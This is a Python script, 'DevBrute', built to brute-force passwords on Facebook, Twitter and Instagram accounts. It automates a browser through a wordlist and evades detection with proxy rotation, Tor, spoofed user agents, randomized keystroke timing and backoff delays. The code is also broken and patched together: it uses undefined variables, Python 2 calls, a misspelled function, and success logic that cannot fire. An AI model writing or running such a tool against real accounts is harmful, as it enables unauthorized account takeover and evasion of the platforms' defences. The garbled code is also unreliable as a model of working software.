import argparse
import os
import random
import re
import sys
import time
import urllib
import urllib.request
import urllib.parse
import threading
import requests
import socket
import json
import hashlib
import base64
import signal
import subprocess
import webbrowser
from time import sleep
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from pyvirtualdisplay import Display
from proxyscrape import create_collector, get_collector

# Define avoidance patterns
import re

avoidance_patterns = [
    r'^[0-9]+$',  # Avoid using all numeric passwords
    r'^[a-zA-Z]+$',  # Avoid using all alphabetic passwords
    r'^[a-zA-Z0-9]+$',  # Avoid using alphanumeric patterns
    # Add more patterns as needed
]

# Define proxies
proxies = [
    'http://1.1.1.1:8080',
    'http://2.2.2.2:8080',
    # Add more proxies as needed
]

# Set up a proxy collector (for proxy rotation)
proxy_collector = create_collector('my_collector', 'http')


class Bruter:
    def __init__(self, service, username, wordlist, delay, fb_name=None):
        self.service = service
        self.username = username
        self.wordlist = wordlist
        self.delay = delay
        self.fb_name = fb_name

    def stopTOR(self):
        # Stopping Tor
        os.system("rm -rf tmp/ geckodriver.log && service tor stop")
        exit(1)

    def execute(self):
        if self.usercheck(self.username) == 1:
            print("[Error] Username does not exist")
            exit(1)

        print("[OK] Checking account existence\n")
        self.webBruteforce(self.username, self.wordlist, self.service, self.delay)

    def usercheck(self, username):
        display = Display(visible=0, size=(800, 600))
        display.start()

        driver = webdriver.Firefox()

        try:
            if self.service == "facebook":
                driver.get("https://www.facebook.com/public/" + self.fb_name)
                assert "We couldn't find anything for" not in driver.page_source
            elif self.service == "twitter":
                driver.get("https://www.twitter.com/" + username)
                assert "Sorry, that page doesn’t exist!" not in driver.page_source
            elif self.service == "instagram":
                driver.get("https://instagram.com/" + username)
                assert "Sorry, this page isn't available." not in driver.page_source

            driver.quit()
            return 0

        except AssertionError:
            driver.quit()
            return 1

    def webBruteforce(self, username, wordlist, service, delay):
        print("\n- Bruteforce starting ( Delay = %s sec ) -\n" % self.delay)
        driver = webdriver.Firefox()
        wordlist = open(wordlist, 'r')

        unsuccessful_attempts = 0

        for i in wordlist.readlines():
            password = i.strip("\n")
            try:
                # Check if the password matches any avoidance pattern
                if any(re.match(pattern, password) for pattern in avoidance_patterns):
                    continue  # Skip this password

                # If login attempt was unsuccessful, increment the count
                unsuccessful_attempts += 1

                # Calculate the delay based on the number of unsuccessful attempts
                progressive_delay = min(delay * (2 ** unsuccessful_attempts), max_delay)

                # Add a randomized delay (with a maximum value)
                randomized_delay = random.uniform(0, progressive_delay)

                # Rotate Proxy
                proxy = random.choice(proxies)
                webdriver.DesiredCapabilities.FIREFOX['proxy'] = {
                    "httpProxy": proxy,
                    "ftpProxy": proxy,
                    "sslProxy": proxy,
                    "proxyType": "MANUAL"
                }

                # Change User-Agent header
                user_agent = ua_generator.random
                headers = {"User-Agent": user_agent}
                driver.execute_cdp_cmd('Network.setUserAgentOverride', {"userAgent": user_agent})

                # Randomize keystroke timing
                for char in password:
                    elem.send_keys(char)
                    time.sleep(random.uniform(0.1, 0.5))  # Random delay between keystrokes

                elem.send_keys(Keys.RETURN)

            except AssertionError:
                print(G + ("  Username: {} \t| Password found: {}\n".format(username,password)) + W)
                driver.quit()
                self.stopTOR()

            except Exception as e:
                print(R + ("\nError : {}".format(e)) + W)
                driver.quit()
                self.stopTOR()


# DevBrute Banner
print("""\033[1;37m
 _____             ____             _       
|  __ \           |  _ \           | |      
| |  | | _____   _| |_) |_ __ _   _| |_ ___ 
| |  | |/ _ \ \ / /  _ <| '__| | | | __/ _ \\
| |__| |  __/\ V /| |_) | |  | |_| | ||  __/
|_____/ \___| \_/ |____/|_|   \__,_|\__\___|""")

url = input('\033[1;34m[?]\033[0m Enter target URL: ')
reload(sys)
sys.setdefaultenciding('utf8')


def main():
    parser = argparse.ArgumentParser(description='BruteForce Framework written by Devprogramming')
    required = parser.add_argument_group('required arguments')
    required.add_argument('-s', '--service', dest='service', required=True)
    required.add_argument('-u', '--username', dest='username', required=True)
    required.add_argument('-w', '--wordlist', dest='password', required=True)
    parser.add_argument('-d', '--delay', type=int, dest='delay')

    args = parser.parse_args()

    service = args.service
    username = args.username
    wordlist = args.password
    delay = args.delay or 1

    if not os.path.exists(wordlist):
        print("[Error] Wordlist not found")
        exit(1)

    if service == "facebook":
        fb_name = input("Please Enter the Name of the Facebook Account: ")
        os.system("clear")

        os.system("/etc/init.d/tor restart && rm -rf tmp/ geckodriver.log")

    br = Bruter(service, username, wordlist, delay, fb_name=fb_name)
    br.execute()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(R + "\nError : Keyboard Interrupt" + W)
        os.system("rm -rf tmp/ geckodriver.log && service tor stop")
        exit(1)
